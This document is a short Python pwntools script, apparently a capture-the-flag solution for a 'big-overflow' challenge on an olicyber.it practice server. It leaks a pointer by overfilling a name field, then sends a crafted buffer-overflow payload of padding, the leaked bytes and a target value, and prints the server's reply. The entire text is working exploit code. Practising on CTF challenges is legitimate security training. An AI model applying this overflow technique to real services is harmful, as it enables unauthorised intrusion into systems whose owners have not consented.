from pwn import *
import binascii

HOST = "big-overflow.challs.olicyber.it"
PORT = 34003

r = remote(HOST, PORT)

r.recvuntil(b"name?")
r.sendline(b"A"*31)

o = r.recvuntil(b"but")[:-3]
ptrValue = binascii.hexlify(o[41:][::-1])

r.recvuntil(b"please: ")

r.sendline(b"A"*32 + (o[41:]) + b"\x00" * (7-len(o[42:])) + p32(0x5ab1bb0))

o = r.recv(1000)
print(o.decode())